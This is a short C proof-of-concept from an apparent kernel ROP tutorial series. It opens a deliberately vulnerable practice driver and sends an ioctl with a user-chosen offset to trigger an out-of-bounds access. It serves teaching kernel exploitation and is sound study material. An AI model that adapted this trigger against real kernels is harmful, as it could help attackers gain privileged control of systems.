/**
 * User-space trigger application for OOB in drv.c
 *
 *
 * Full article: https://lonerangerweb.wordpress.com/2016/06/23/linux-kernel-rop-ropping-your-way-to-part-1/
 *				 https://lonerangerweb.wordpress.com/2016/06/26/linux-kernel-rop-ropping-your-way-to-part-2/
 *
 * Author: Lone Ranger
 * Email: ultimate31337@gmail.com
 *
 **/

#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "drv.h"

#define DEVICE_PATH "/dev/vulndrv"

int main(int argc, char **argv) {
	int fd;
	struct drv_req req;

	req.offset = atoll(argv[1]);

	//map = mmap((void *)..., ..., 3, 0x32, 0, 0);

	fd = open(DEVICE_PATH, O_RDONLY);

	if (fd == -1) {
		perror("open");
	}

	ioctl(fd, 0, &req);

	return 0;
}
